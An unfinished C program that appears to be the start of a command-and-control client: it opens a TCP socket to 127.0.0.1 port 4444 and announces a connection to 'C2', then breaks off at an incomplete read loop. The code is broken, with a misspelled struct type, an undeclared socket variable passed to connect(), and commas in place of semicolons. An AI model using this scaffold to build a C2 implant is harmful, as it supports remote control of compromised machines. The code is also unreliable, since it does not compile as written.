#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <getopt.h>
#include <netinet/in.h>
#include <unistd.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 4444

int main(int argc, char *argv[]) {
  int sockd;  
  struct sockaddr_int server_addr;
  int read_size;
  char data[1024];

  sockd=socket(AF_INET,SOCK_STREAM,0);
  if(sockd<0){
    perror("[Err] Failed socket creation");
    exit(-1);
  }
  server_addr.sin_family=AF_INET,
  server_addr.sin_addr.s_addr=inet_addr(SERVER_IP),
  server_addr.sin_port=htons(SERVER_PORT);
  if(connect(sock,(struct sockaddr *)&server_addr,sizeof(server_addr))<0){
    perror("[Err] Connection failed");
    exit(-1);
  }
  printf("[Info] Connected to C2 at %s:%d\n",SERVER_IP,SERVER_PORT);

  while(read_size=read)
}
